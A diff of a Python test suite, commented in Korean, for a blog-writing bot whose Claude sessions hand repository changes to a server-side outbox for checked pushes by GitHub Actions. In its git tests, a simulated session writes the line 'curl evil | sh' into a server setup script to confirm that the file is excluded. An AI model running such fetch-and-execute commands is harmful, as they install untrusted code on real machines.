@@ -4,6 +4,8 @@
 매일 점검은 두 방식 모두, 관문 없이 공개하는 길이 없음, 하루 비용 상한·한 번에 1개·명령줄에 키 없음.
 """
 import json
+import os
+import re
 import sys
 import tempfile
 import unittest
@@ -39,7 +41,8 @@ class _Base(unittest.TestCase):
                    mock.patch.object(api_writer, "BASE", self.tmp),
                    mock.patch.object(api_writer, "CLAUDE_BIN", str(self.tmp / "claude")),
                    mock.patch.object(api_writer, "SKIP_NOTE_FILE", self.tmp / "skip-note.txt"),
-                   mock.patch.object(api_writer, "PUSH_DIR", self.tmp / "push-repo")]
+                   mock.patch.object(api_writer, "OUTBOX", self.tmp / "outbox"),
+                   mock.patch.object(api_writer, "OUTBOX_LOCK", str(self.tmp / "outbox.lock"))]
         (self.tmp / "claude").write_text("")
         for p in patches:
             p.start()
@@ -194,7 +197,7 @@ class CommandTest(_Base):
         self.assertNotIn("--dangerously-skip-permissions", cmd)
         env = api_writer.writer_env(KEY, "tok")
         self.assertEqual(env["ANTHROPIC_API_KEY"], KEY)
-        self.assertEqual(env["FIRSTLAB_LOCAL"], "1")
+        self.assertEqual(env["FIRSTLAB_LOCAL"], "push")   # 보통은 저장소 일까지 (11/12 '지금하고 똑같은 작업')
         self.assertNotIn("ANTHROPIC_API_KEY", api_writer.writer_env())   # git 명령에는 키 없음
         self.assertEqual(api_writer.redact(f"x {KEY} y", KEY), "x *** y")
 
@@ -224,8 +227,11 @@ class CommandTest(_Base):
                 mock.patch("bot.config.load_secrets", return_value={"FIRSTLAB_API_TOKEN": "site-token"}), \
                 mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: logs.append((ok, msg, cost))), \
                 mock.patch.object(api_writer, "prepare_workdir"), \
+                mock.patch.object(api_writer, "repo_mode", return_value=("1", "시험: 쉬는 중")), \
+                mock.patch.object(api_writer, "note_repo_skipped"), \
+                mock.patch.object(api_writer, "head_sha", return_value="base000"), \
                 mock.patch.object(api_writer.subprocess, "Popen", Proc), \
-                mock.patch.object(api_writer, "new_queue_files", side_effect=lambda env: sorted(queue.glob("*.json"))), \
+                mock.patch.object(api_writer, "new_queue_files", side_effect=lambda env, ref="": sorted(queue.glob("*.json"))), \
                 mock.patch.object(api_writer, "other_changes", return_value=[]), \
                 mock.patch.object(publish_queue, "main") as publish, \
                 mock.patch("bot.publish_queue._marker", return_value=self.tmp / "nomarker"):
@@ -251,7 +257,7 @@ class CommandTest(_Base):
         self.assertFalse((self.tmp / "status.json").exists())
 
     def test_maintenance_makes_no_done_file(self):
-        """매일 점검은 글쓰기 실행이 아님 → 끝 표시를 대신 만들지 않음 (연속 작성이 '한 편 끝'으로 착각하지 않게). 보고는 봇 기록에."""
+        """매일 점검은 글쓰기 실행이 아님 → 끝 표시를 대신 만들지 않음 (연속 작성이 '한 편 끝'으로 착각하지 않게). 보고는 봇 기록·알림 통로에."""
         result = {"type": "result", "subtype": "success", "is_error": False, "total_cost_usd": 0.3, "result": "이상 없음"}
         code, _, logs, publish = self.run_once(result, {}, text="maintenance-check")
         self.assertEqual(code, 0)
@@ -283,94 +289,253 @@ class CommandTest(_Base):
         self.assertEqual(api_writer.deliver([good], dest), [])            # 같은 내용은 다시 안 넣음
 
 
-GH = "github_pat_TESTPUSHTOKENDONOTPRINT"
 OK_RESULT = {"type": "result", "subtype": "success", "is_error": False, "total_cost_usd": 2.5, "result": "대기 글 검수 1편"}
 
 
-class PushModeTest(CommandTest):
-    """운영자 11/12 '대기 글 검수 결과 반영·새 계산기·연초 기준값도 api 모드에서': 서버 비밀값 GITHUB_PUSH_TOKEN 이 있으면
-    세션은 다 하고(FIRSTLAB_LOCAL=push), root 쪽이 검사 통과 뒤 main 에 push. 토큰은 세션에 절대 안 감."""
+class RepoModeTest(CommandTest):
+    """운영자 11/12 '예비 필요 없고 그냥 api로 할 때 지금하고 똑같은 작업을': 토큰 등 새 설정 없이 세션은 저장소 일까지 다 하고
+    (FIRSTLAB_LOCAL=push), 서버가 검사 → 새 글은 바로 같은 관문, 저장소 수정은 묶음(OUTBOX)으로 → GitHub Actions 가 main 에."""
 
-    def run_push(self, write, push=None, secrets=None, text="slot-1"):
-        Proc, calls, queue = self.fake_session(OK_RESULT, write)
+    def run_repo(self, write, build=None, text="slot-1", stacked=None, health=None, result=OK_RESULT):
+        Proc, calls, queue = self.fake_session(result, write)
         logs = []
-        secrets = secrets if secrets is not None else {"FIRSTLAB_API_TOKEN": "site-token", "GITHUB_PUSH_TOKEN": GH}
-        push = push or mock.Mock(return_value=("abc1234def", ["wordpress/queue/new-post.json"], []))
+        if health is not None:
+            (self.tmp / "outbox").mkdir(exist_ok=True)
+            (self.tmp / "outbox" / "health.json").write_text(json.dumps(health))
+        build = build or mock.Mock(return_value=(b"BUNDLE", "head111", "orig000", ["wordpress/queue/new-post.json"], []))
         with mock.patch("bot.settings.load_settings", return_value=settings("bot")), \
                 mock.patch("bot.state.load_state", return_value={"log": [], "review_target": {"post_id": 7}, "calc_yearly": [1, 2]}), \
-                mock.patch("bot.config.load_secrets", return_value=secrets), \
+                mock.patch("bot.config.load_secrets", return_value={"FIRSTLAB_API_TOKEN": "site-token"}), \
                 mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: logs.append((ok, msg, cost))), \
                 mock.patch.object(api_writer, "prepare_workdir"), \
+                mock.patch.object(api_writer, "stack_pending", return_value={} if stacked is None else stacked) as stack, \
                 mock.patch.object(api_writer, "head_sha", return_value="base000"), \
                 mock.patch.object(api_writer.subprocess, "Popen", Proc), \
-                mock.patch.object(api_writer, "new_queue_files", side_effect=lambda env: sorted(queue.glob("*.json"))), \
+                mock.patch.object(api_writer, "new_queue_files", side_effect=lambda env, ref="": sorted(queue.glob("*.json"))), \
                 mock.patch.object(api_writer, "other_changes", return_value=[]), \
                 mock.patch.object(api_writer, "write_done_in_workdir", return_value=None), \
-                mock.patch.object(api_writer, "push_changes", push), \
+                mock.patch.object(api_writer, "rename_collisions", side_effect=lambda files, env: files), \
+                mock.patch.object(api_writer, "build_bundle", build), \
                 mock.patch.object(publish_queue, "main") as publish, \
                 mock.patch("bot.publish_queue._marker", return_value=self.tmp / "nomarker"):
             code = api_writer.run_once(text, "글 작성 07:40")
-        return code, calls, logs, publish, push
+        return code, calls, logs, publish, build, stack
 
     def local(self):
         return sorted(p.name for p in (self.tmp / "local-queue").glob("*.json"))
 
-    def test_token_never_reaches_session(self):
-        code, calls, logs, publish, push = self.run_push({"new-post.json": {"keyword": "x"}, "done-1.json": {"type": "run_done"}})
+    def test_no_extra_setup_session_does_repo_work(self):
+        """GitHub 토큰 없이도 저장소 일까지 (FIRSTLAB_LOCAL=push). 서버에도 세션에도 GitHub 쓰기 비밀값이 없음."""
+        code, calls, logs, publish, build, stack = self.run_repo({"new-post.json": {"keyword": "x"}})
         self.assertEqual(code, 0)
-        self.assertTrue(all(GH not in a for a in calls["cmd"]))               # 명령줄에 없음
-        self.assertTrue(all(GH not in v for v in calls["kw"]["env"].values()))  # 세션 환경에도 없음
-        self.assertNotIn("GITHUB_PUSH_TOKEN", calls["kw"]["env"])
         self.assertEqual(calls["kw"]["env"]["FIRSTLAB_LOCAL"], "push")
         self.assertIn("FIRSTLAB_LOCAL=push", calls["cmd"][2])
-        env, base, token, _msg = push.call_args.args
-        self.assertEqual((base, token), ("base000", GH))                       # 토큰은 root 쪽 push 에만
-        self.assertTrue(all(GH not in v for v in env.values()))                # 작업 폴더 git 명령 환경에도 없음
-        self.assertTrue(all(GH not in m for _, m, _ in logs))
+        self.assertFalse([k for k in calls["kw"]["env"] if "GITHUB" in k])
+        stack.assert_called_once()                       # 앞 실행 결과 위에서 시작 (같은 검수 두 번 안 함)
+        self.assertEqual(build.call_args.args[1], "base000")
+        src = (ROOT / "bot" / "api_writer.py").read_text(encoding="utf-8")
+        self.assertNotIn("GITHUB_PUSH_TOKEN", src)       # 예전 토큰 길은 없앰 (한 길만)
 
-    def test_pushed_files_not_double_posted(self):
-        """올렸으면 queue 파일은 배포가 올림 → 서버 대기 폴더로 넣지 않음 (같은 글 두 번 방지)."""
-        code, _, logs, publish, push = self.run_push({"new-post.json": {"keyword": "x"}, "done-1.json": {"type": "run_done"}})
-        push.assert_called_once()
-        self.assertEqual(self.local(), [])
-        publish.assert_not_called()
+    def test_success_publishes_now_and_leaves_bundle(self):
+        """검사 통과: 새 글·끝 표시는 바로 같은 관문 (연속 작성이 GitHub 반영을 기다리지 않음), 저장소 수정은 묶음으로."""
+        code, _, logs, publish, _, _ = self.run_repo({"new-post.json": {"keyword": "x"}, "done-1.json": {"type": "run_done"},
+                                                      "reviewdone-7-1.json": {"type": "review_done", "post_id": 7}})
+        self.assertEqual(self.local(), ["done-1.json", "new-post.json", "reviewdone-7-1.json"])
+        publish.assert_called_once()
+        self.assertEqual((self.tmp / "outbox" / "pending.bundle").read_bytes(), b"BUNDLE")
+        meta = json.loads((self.tmp / "outbox" / "pending.json").read_text())
+        self.assertEqual((meta["head"], meta["origin"]), ("head111", "orig000"))
+        self.assertEqual(meta["runs"][-1]["label"], "글 작성 07:40")
         self.assertTrue(logs[-1][0])
-        self.assertIn("main 에 올림 abc1234", logs[-1][1])
+        self.assertIn("GitHub 반영 대기", logs[-1][1])
 
-    def test_failed_checks_push_nothing_but_keep_posts(self):
-        """검사 실패 → 아무것도 안 올림, 봇 기록에 실패한 검사 이름, 새 글·끝 표시는 대기 폴더로 (글이 안 사라짐),
+    def test_bundle_keeps_oldest_since_and_runs(self):
+        stacked = {"since": "2026-11-12 03:00", "runs": [{"label": "앞 실행"}]}
+        self.run_repo({"new-post.json": {"keyword": "x"}}, stacked=stacked)
+        meta = json.loads((self.tmp / "outbox" / "pending.json").read_text())
+        self.assertEqual(meta["since"], "2026-11-12 03:00")         # 안 올라간 가장 오래된 결과 기준 (6시간 정리)
+        self.assertEqual([r["label"] for r in meta["runs"]], ["앞 실행", "글 작성 07:40"])
+
+    def test_failed_checks_no_bundle_but_keep_posts(self):
+        """검사 실패 → 묶음 없음, 봇 기록에 실패한 검사 이름, 새 글·끝 표시는 대기 폴더로 (글이 안 사라짐),
         검수 끝 파일은 버림 (고친 내용이 저장소에 없는데 '검수 끝'·'공개 직전 재검수 끝'으로 처리되면 안 됨)."""
         failing = mock.Mock(side_effect=api_writer.PushFailed("검사 실패", ["BotTest.test_calc_rates"]))
-        code, _, logs, publish, _ = self.run_push(
+        code, _, logs, publish, _, _ = self.run_repo(
             {"new-post.json": {"keyword": "x"}, "done-1.json": {"type": "run_done"},
-             "reviewdone-7-1.json": {"type": "review_done", "post_id": 7, "prepublish": True}}, push=failing)
+             "reviewdone-7-1.json": {"type": "review_done", "post_id": 7, "prepublish": True}}, build=failing)
         self.assertEqual(self.local(), ["done-1.json", "new-post.json"])
         publish.assert_called_once()
+        self.assertFalse((self.tmp / "outbox" / "pending.bundle").exists())
         fail = [m for ok, m, _ in logs if not ok]
         self.assertTrue(any("BotTest.test_calc_rates" in m and "main 에 안 올림" in m and "검수 끝 파일 1개는 버림" in m for m in fail), fail)
         self.assertTrue(logs[-1][0])   # 세션 자체는 성공 (다음 실행이 새 main 에서 다시 — 영원히 막히지 않음)
 
-    def test_unexpected_push_error_also_falls_back(self):
-        boom = mock.Mock(side_effect=OSError(f"연결 끊김 {GH}"))
-        _, _, logs, publish, _ = self.run_push({"new-post.json": {"keyword": "x"}}, push=boom)
-        self.assertEqual(self.local(), ["new-post.json"])
-        self.assertTrue(all(GH not in m for _, m, _ in logs))   # 오류 문구에 토큰이 섞여도 가림
+    def test_nothing_changed_no_bundle(self):
+        build = mock.Mock(return_value=(b"", "", "", [], []))
+        self.run_repo({"skip-1.json": {"type": "skip", "keywords": []}}, build=build)
+        self.assertFalse((self.tmp / "outbox" / "pending.bundle").exists())
+        self.assertIn("skip-1.json", self.local())
 
-    def test_no_token_keeps_old_path_and_notes_once_a_day(self):
-        push = mock.Mock()
+    def test_rest_mode_after_repeated_failures(self):
+        """반영이 연속 실패하면 하루 쉬기 (같은 검수를 매번 다시 해 돈만 쓰지 않게) → 기한 뒤 다시 push (영원히 안 쉼)."""
+        future = (datetime.now() + api_writer.timedelta(hours=5)).strftime("%Y-%m-%d %H:%M")
         for run_no in range(2):
-            code, calls, logs, publish, _ = self.run_push({"new-post.json": {"keyword": "x"}}, push=push,
-                                                          secrets={"FIRSTLAB_API_TOKEN": "site-token"})
+            code, calls, logs, publish, build, stack = self.run_repo({"new-post.json": {"keyword": "x"}},
+                                                                     health={"fails": 2, "rest_until": future, "last_why": "push 거절"})
             self.assertEqual(calls["kw"]["env"]["FIRSTLAB_LOCAL"], "1")
-            notes = [m for ok, m, _ in logs if "GITHUB_PUSH_TOKEN" in m]
+            build.assert_not_called()
+            stack.assert_not_called()
+            notes = [m for ok, m, _ in logs if "건너뜀" in m and "밀린 일" in m]
+            self.assertEqual(len(notes), 1 if run_no == 0 else 0)    # 하루 한 번만
             if run_no == 0:
-                self.assertEqual(len(notes), 1)
                 self.assertIn("대기 글 검수 1건, 연초 기준값 2건", notes[0])
-                self.assertIn("set-secrets.sh GITHUB_PUSH_TOKEN", notes[0])
-            else:
-                self.assertEqual(notes, [])        # 같은 날 두 번째 실행은 알림 안 함
-        push.assert_not_called()
+                self.assertIn("push 거절", notes[0])
         self.assertIn("new-post.json", self.local())
+        past = (datetime.now() - api_writer.timedelta(hours=1)).strftime("%Y-%m-%d %H:%M")
+        _, calls, _, _, build, _ = self.run_repo({"b.json": {"keyword": "y"}}, health={"fails": 2, "rest_until": past})
+        self.assertEqual(calls["kw"]["env"]["FIRSTLAB_LOCAL"], "push")
+        build.assert_called_once()
+
+    def test_stack_conflict_skips_repo_work_this_run(self):
+        build2 = mock.Mock()
+        Proc, calls2, queue = self.fake_session(OK_RESULT, {"c.json": {"keyword": "z"}})
+        logs2 = []
+        with mock.patch("bot.settings.load_settings", return_value=settings("bot")), \
+                mock.patch("bot.state.load_state", return_value={"log": []}), \
+                mock.patch("bot.config.load_secrets", return_value={}), \
+                mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: logs2.append((ok, msg))), \
+                mock.patch.object(api_writer, "prepare_workdir"), \
+                mock.patch.object(api_writer, "stack_pending", return_value=None), \
+                mock.patch.object(api_writer, "head_sha", return_value="base000"), \
+                mock.patch.object(api_writer.subprocess, "Popen", Proc), \
+                mock.patch.object(api_writer, "new_queue_files", side_effect=lambda env, ref="": sorted(queue.glob("*.json"))), \
+                mock.patch.object(api_writer, "other_changes", return_value=[]), \
+                mock.patch.object(api_writer, "build_bundle", build2), \
+                mock.patch.object(publish_queue, "main"), \
+                mock.patch("bot.publish_queue._marker", return_value=self.tmp / "nomarker"):
+            self.assertEqual(api_writer.run_once("", "x"), 0)
+        self.assertEqual(calls2["kw"]["env"]["FIRSTLAB_LOCAL"], "1")   # 충돌한 앞 묶음은 GitHub 쪽이 처리할 때까지 저장소 일 쉼
+        build2.assert_not_called()
+        self.assertTrue(any("충돌" in m for _, m in logs2))
+
+    def test_maintenance_report_goes_to_alert_channel(self):
+        """매일 점검: 월정액은 끝 메시지가 휴대폰 알림 → API 봇은 전문을 봇 기록에, 문제 수를 알림 통로(Health check)로."""
+        res = {**OK_RESULT, "result": "문제 2건\n- 사진 채우기 실패\n- 보류 3편"}
+        code, _, logs, publish, build, _ = self.run_repo({}, text="maintenance-check", result=res,
+                                                          build=mock.Mock(return_value=(b"", "", "", [], [])))
+        self.assertEqual(code, 0)
+        report = api_writer.take_maint_report()
+        self.assertEqual(report["problems"], 2)
+        self.assertEqual(api_writer.take_maint_report(), {})            # 한 번만 보냄
+        full = [m for ok, m, _ in logs if m.startswith("매일 점검 보고(API 봇)")]
+        self.assertEqual(len(full), 1)
+        self.assertIn("보류 3편", full[0])
+        self.assertFalse(self.local())                                   # 점검은 끝 표시를 안 만듦
+
+    def test_maintenance_failure_also_alerts(self):
+        res = {"type": "result", "subtype": "error_during_execution", "is_error": True, "total_cost_usd": 0.1}
+        self.run_repo({}, text="maintenance-check", result=res)
+        self.assertEqual(api_writer.take_maint_report()["problems"], -2)
+
+    def test_problem_count_parsing(self):
+        self.assertEqual(api_writer.maint_problems("이상 없음\n품질 …"), 0)
+        self.assertEqual(api_writer.maint_problems("문제 3건\n- a"), 3)
+        self.assertEqual(api_writer.maint_problems("오늘 점검 결과입니다"), -1)   # 형식이 다르면 알림은 감
+        guide = (ROOT / "automation" / "maintenance.md").read_text(encoding="utf-8")
+        self.assertIn("첫 줄은 `이상 없음` 또는 `문제 N건`", guide)
+
+
+class OutboxTest(_Base):
+    """서버 쪽 반영 대기 묶음: 가져가기·결과·정리 — 영원히 남거나 같은 것을 무한 반복하지 않게 (설계 점검 2)."""
+
+    def setUp(self):
+        super().setUp()
+        self.logs = []
+        p = mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: self.logs.append((ok, msg)))
+        p.start()
+        self.addCleanup(p.stop)
+
+    def pend(self, head="h1", since=None):
+        api_writer.save_pending(b"B-" + head.encode(), head, "o1", {"since": since} if since else {}, {"label": f"실행 {head}"})
+
+    def test_claim_result_pushed(self):
+        self.assertEqual(api_writer.outbox_claim(), {})
+        self.pend()
+        got = api_writer.outbox_claim()
+        self.assertEqual((got["head"], got["tries"], got["runs"]), ("h1", 1, ["실행 h1"]))
+        self.assertEqual(Path(got["path"]).read_bytes(), b"B-h1")
+        self.assertFalse((self.tmp / "outbox" / "pending.bundle").exists())
+        self.assertEqual(api_writer.outbox_result("other", "pushed", "s"), "stale")   # 다른 묶음 결과는 무시
+        self.assertEqual(api_writer.outbox_result("h1", "pushed", "abcdef12"), "done")
+        self.assertFalse((self.tmp / "outbox" / "claimed.bundle").exists())
+        self.assertTrue(self.logs[-1][0])
+        self.assertIn("main 에 올림 abcdef1", self.logs[-1][1])
+        self.assertEqual(api_writer.outbox_claim(), {})
+
+    def test_new_pending_supersedes_claimed(self):
+        """가져간 묶음이 결과 없이 남았는데 새 대기 묶음이 생기면 새 것(앞 것을 포함)을 가져감."""
+        self.pend("h1")
+        api_writer.outbox_claim()
+        self.pend("h2")
+        got = api_writer.outbox_claim()
+        self.assertEqual(got["head"], "h2")
+        self.assertEqual(Path(got["path"]).read_bytes(), b"B-h2")
+        self.assertFalse(list((self.tmp / "outbox").glob("failed/*")))
+
+    def test_retry_then_give_up(self):
+        self.pend()
+        api_writer.outbox_claim()
+        self.assertEqual(api_writer.outbox_result("h1", "retry", why="main 이 바뀜"), "retry")
+        for tries in range(2, api_writer.CLAIM_TRIES + 1):
+            self.assertEqual(api_writer.outbox_claim()["tries"], tries)
+        self.assertEqual(api_writer.outbox_claim(), {})                  # 3번 결과 없이 끝나면 실패로 (무한 반복 금지)
+        self.assertEqual(len(list((self.tmp / "outbox" / "failed").glob("*.bundle"))), 1)
+        self.assertFalse(self.logs[-1][0])
+        self.assertIn("main 이 바뀜", self.logs[-1][1])
+
+    def test_failures_rest_one_day_then_retry(self):
+        self.assertEqual(api_writer.repo_mode(), ("push", ""))
+        for head in ("h1", "h2"):
+            self.pend(head)
+            api_writer.outbox_claim()
+            self.assertEqual(api_writer.outbox_result(head, "failed", why="검사 실패: BotTest.test_x"), "failed")
+        mode, why = api_writer.repo_mode()
+        self.assertEqual(mode, "1")
+        self.assertIn("BotTest.test_x", why)
+        self.assertIn("저장소 일은 건너뜀", self.logs[-1][1])
+        later = datetime.now() + api_writer.timedelta(hours=api_writer.UNHEALTHY_HOURS + 1)
+        with mock.patch.object(api_writer, "_now", return_value=later):
+            self.assertEqual(api_writer.repo_mode()[0], "push")             # 하루 뒤 다시 시도
+        self.pend("h3")
+        api_writer.outbox_claim()
+        api_writer.outbox_result("h3", "already")
+        self.assertEqual(json.loads((self.tmp / "outbox" / "health.json").read_text())["fails"], 0)
+
+    def test_stale_pending_failed_by_housekeeping(self):
+        """GitHub Actions 가 멈춰 6시간 넘게 안 가져가면 실패로 정리 (봇 기록 ❌ → 매일 점검이 알림)."""
+        self.pend("h1", since="2026-11-12 00:00")
+        with mock.patch.object(api_writer, "_now", return_value=datetime(2026, 11, 12, 7, 0)):
+            api_writer.housekeeping()
+        self.assertFalse((self.tmp / "outbox" / "pending.bundle").exists())
+        self.assertEqual(len(list((self.tmp / "outbox" / "failed").glob("*.bundle"))), 1)
+        self.assertIn("6시간", self.logs[-1][1])
+
+    def test_cli_prints_json_last_line(self):
+        self.pend()
+        import io
+        from contextlib import redirect_stdout
+        buf = io.StringIO()
+        with redirect_stdout(buf):
+            self.assertEqual(api_writer.main(["outbox", "claim"]), 0)
+        self.assertEqual(json.loads(buf.getvalue().splitlines()[-1])["head"], "h1")
+        buf = io.StringIO()
+        with redirect_stdout(buf):
+            api_writer.main(["outbox", "result", "--head", "h1", "--status", "pushed", "--sha", "abc"])
+        self.assertEqual(json.loads(buf.getvalue().splitlines()[-1]), {"result": "done"})
+
+    def test_housekeeping_called_from_minute_bot(self):
+        src = (ROOT / "bot" / "run.py").read_text(encoding="utf-8")
+        self.assertIn("api_writer.housekeeping()", src)
 
 
 def _plain_writer(cmd, env, timeout=300, cwd=None, binary=False):
@@ -379,8 +544,19 @@ def _plain_writer(cmd, env, timeout=300, cwd=None, binary=False):
                                      timeout=timeout)
 
 
-class PushGitTest(_Base):
-    """진짜 git 으로: 작업 폴더 → 검사 → root 쪽 bare 저장소 → (가짜 GitHub = 로컬 bare 저장소) main."""
+SEED = {
+    "wordpress/queue/old.json": "{}\n", "wordpress/patches.json": "[]\n", "bot/gate.py": "x = 1\n",
+    "server/setup.sh": "echo hi\n", "README.md": "a\n", "automation/reviewed.txt": "1 첫 글\n",
+    "automation/common_errors.py": "# 유형표 (시험용: 바꾸는 것 없음)\n",
+    "automation/common-errors.md": "# 자주 틀린 유형\n",
+    "tests/test_ok.py": "import unittest\n\n\nclass OkTest(unittest.TestCase):\n    def test_ok(self):\n        pass\n",
+    "tests/test_calculators.mjs": "process.exit(0);\n",
+}
+
+
+class ApiSyncGitTest(_Base):
+    """진짜 git 으로 처음부터 끝까지: 서버 작업 폴더 → 묶음(OUTBOX) → 다음 실행이 그 위에 쌓음 →
+    GitHub 쪽(automation/api_sync.py)이 최신 main 위에서 검사(진짜 check_work) → main 에 fast-forward → 서버에 결과."""
 
     def git(self, *args, cwd=None):
         r = api_writer.subprocess.run(["git", *args], cwd=cwd, env=self.env, capture_output=True, text=True)
@@ -389,95 +565,273 @@ class PushGitTest(_Base):
 
     def setUp(self):
         super().setUp()
-        self.env = api_writer.writer_env(local="push")
+        sys.path.insert(0, str(ROOT / "automation"))
+        import api_sync
+        self.sync = api_sync
+        self.env = {**api_writer.writer_env(local="push"), "PATH": os.environ.get("PATH", "/usr/bin:/bin")}
         self.origin = self.tmp / "origin.git"
         self.git("init", "-q", "--bare", "-b", "main", str(self.origin))
         seed = self.tmp / "seed"
         self.git("clone", "-q", str(self.origin), str(seed))
         self.git("checkout", "-q", "-b", "main", cwd=seed)
-        for rel, body in {"wordpress/queue/old.json": "{}", "bot/gate.py": "x = 1\n", "server/setup.sh": "echo hi\n",
-                          "README.md": "a\n"}.items():
+        for rel, body in SEED.items():
             (seed / rel).parent.mkdir(parents=True, exist_ok=True)
-            (seed / rel).write_text(body)
+            (seed / rel).write_text(body, encoding="utf-8")
+        for rel in ("automation/merge_json_list.py", ".gitattributes"):
+            (seed / rel).write_bytes((ROOT / rel).read_bytes())
         self.git("add", "-A", cwd=seed)
         self.git("commit", "-q", "-m", "처음", cwd=seed)
         self.git("push", "-q", "origin", "main", cwd=seed)
         self.seed = seed
         self.git("clone", "-q", "-b", "main", str(self.origin), str(self.tmp / "repo"))
+        self.logs = []
         for p in (mock.patch.object(api_writer, "_as_writer", _plain_writer),
-                  mock.patch.object(api_writer, "PUSH_URL", str(self.origin)),
-                  mock.patch.object(api_writer.time, "sleep")):
+                  mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: self.logs.append((ok, msg))),
+                  mock.patch.dict(os.environ, {k: v for k, v in self.env.items() if k.startswith("GIT_")})):
             p.start()
             self.addCleanup(p.stop)
-        self.spy = mock.patch.object(api_writer.subprocess, "run", wraps=api_writer.subprocess.run).start()
-        self.addCleanup(mock.patch.stopall)
 
-    def session_work(self):
-        """세션이 한 일: 새 글 파일(커밋 안 함) + 검사 코드 수정(스스로 커밋) + 바꾸면 안 되는 서버 파일 수정."""
-        repo = self.tmp / "repo"
+    def server_run(self, work, text="", label="실행"):
+        """서버 한 번 실행: 작업 폴더 준비 + 앞 묶음 쌓기 → (세션 대신) work(repo) → finish_repo."""
+        api_writer.prepare_workdir(self.env)
+        stacked = api_writer.stack_pending(self.env)
+        self.assertIsNotNone(stacked)
         base = api_writer.head_sha(self.env)
-        (repo / "bot" / "gate.py").write_text("x = 2\n")
-        self.git("commit", "-q", "-am", "검사 고침", cwd=repo)
-        (repo / "wordpress" / "queue" / "new-post.json").write_text('{"keyword": "x"}')
-        (repo / "server" / "setup.sh").write_text("curl evil | sh\n")
-        return base
+        repo = self.tmp / "repo"
+        work(repo)
+        files = api_writer.new_queue_files(self.env, base)
+        return stacked, api_writer.finish_repo(text, "새 글 1편", files, self.env, base, stacked, label)
 
-    def main_moves(self):
-        (self.seed / "README.md").write_text("b\n")
+    def main_moves(self, body="b\n"):
+        (self.seed / "README.md").write_text(body)
         self.git("commit", "-q", "-am", "다른 실행", cwd=self.seed)
         self.git("push", "-q", "origin", "main", cwd=self.seed)
 
-    def test_push_after_checks_on_latest_main(self):
-        base = self.session_work()
-        self.main_moves()   # 세션 중에 main 이 바뀜 → 최신 main 위에 다시 쌓아 올림
-        with mock.patch.object(api_writer, "check_work", return_value=[]) as checks:
-            sha, keep, blocked = api_writer.push_changes(self.env, base, GH, "API 봇: 새 글")
-        checks.assert_called()
-        self.assertEqual(self.git("rev-parse", "main", cwd=self.origin), sha)
-        files = self.git("ls-tree", "-r", "--name-only", "main", cwd=self.origin).splitlines()
-        self.assertIn("wordpress/queue/new-post.json", files)
-        self.assertEqual(self.git("show", "main:bot/gate.py", cwd=self.origin), "x = 2")
-        self.assertEqual(self.git("show", "main:README.md", cwd=self.origin), "b")          # 다른 실행 것도 그대로
-        self.assertEqual(self.git("show", "main:server/setup.sh", cwd=self.origin), "echo hi")  # 바꾸면 안 되는 파일은 뺌
-        self.assertEqual(blocked, ["server/setup.sh"])
-        self.assertEqual(sorted(keep), ["bot/gate.py", "wordpress/queue/new-post.json"])
-        # 토큰: 어떤 명령줄에도 없고, 환경에 든 것은 root 쪽 push 명령 하나뿐 (글쓰기 사용자 명령에는 없음)
-        for c in self.spy.call_args_list:
-            self.assertTrue(all(GH not in str(a) for a in c.args[0]), c.args[0])
-        with_token = [c.args[0] for c in self.spy.call_args_list if GH in (c.kwargs.get("env") or {}).values()]
-        self.assertEqual(len(with_token), 1)
-        self.assertIn("push", with_token[0])
-        self.assertNotIn(GH, (self.tmp / "push-repo" / "config").read_text())   # git 설정에 안 남음
-        self.assertFalse(list((self.tmp / "push-repo").glob("tmp*")))           # 임시 askpass·묶음 지움
+    def github(self, name="gh"):
+        """GitHub 작업의 checkout (main 전체 이력)."""
+        path = self.tmp / name
+        if not path.exists():
+            self.git("clone", "-q", "-b", "main", str(self.origin), str(path))
+        else:
+            self.git("fetch", "-q", "origin", cwd=path)
+        return path
 
-    def test_failed_checks_push_nothing(self):
-        base = self.session_work()
-        before = self.git("rev-parse", "main", cwd=self.origin)
-        with mock.patch.object(api_writer, "check_work", return_value=["BotTest.test_gate"]):
-            with self.assertRaises(api_writer.PushFailed) as ctx:
-                api_writer.push_changes(self.env, base, GH, "API 봇: 새 글")
-        self.assertEqual(ctx.exception.failed, ["BotTest.test_gate"])
-        self.assertEqual(self.git("rev-parse", "main", cwd=self.origin), before)
-        self.assertTrue((self.tmp / "repo" / "wordpress" / "queue" / "new-post.json").exists())   # 대기 폴더로 넘길 수 있게 남음
+    def github_round(self):
+        """deploy.yml sync_* 를 그대로: claim → check(검사) → push → report. 서버에 알린 결과."""
+        claim = api_writer.outbox_claim()
+        if not claim:
+            return None, {}
+        gh = self.github("gh-check-" + claim["head"][:7] + str(claim["tries"]))
+        res = self.sync.apply_bundle(gh, Path(claim["path"]), self.tmp / f"work-{claim['head'][:7]}-{claim['tries']}",
+                                     self.tmp / f"tested-{claim['head'][:7]}.bundle")
+        push = {"status": ""}
+        if res["status"] == "ok":
+            push = self.sync.push_tested(self.github("gh-push"), self.tmp / f"tested-{claim['head'][:7]}.bundle",
+                                         res["sha"], res["base"])
+        status, sha, why = self.sync.final_status("success", res["status"], res.get("why", ""), "success" if res["status"] == "ok" else "skipped",
+                                                  push["status"], push.get("why", ""), res.get("sha", ""))
+        return api_writer.outbox_result(claim["head"], status, sha, why), {"check": res, "push": push}
 
-    def test_root_side_refuses_disallowed_files(self):
-        """작업 폴더 쪽 거르기는 글쓰기 사용자 git 이 했으니 root 쪽에서 한 번 더 — 서버 파일이 든 묶음은 안 올림."""
+    def origin_file(self, rel):
+        return self.git("show", f"main:{rel}", cwd=self.origin)
+
+    def test_end_to_end_two_runs_stacked_then_pushed(self):
+        def run1(repo):
+            (repo / "wordpress" / "queue" / "new-post.json").write_text('{"keyword": "x"}')
+            (repo / "bot" / "gate.py").write_text("x = 2\n")
+            self.git("commit", "-q", "-am", "검사 고침", cwd=repo)          # 세션이 스스로 커밋해도 됨
+            (repo / "server" / "setup.sh").write_text("curl evil | sh\n")    # 바꾸면 안 되는 파일 → 빠짐
+        _, (note, taken, fail) = self.server_run(run1, label="실행1")
+        self.assertEqual(fail, "")
+        self.assertIn("GitHub 반영 대기", note)
+        self.assertIn("server/setup.sh", note)
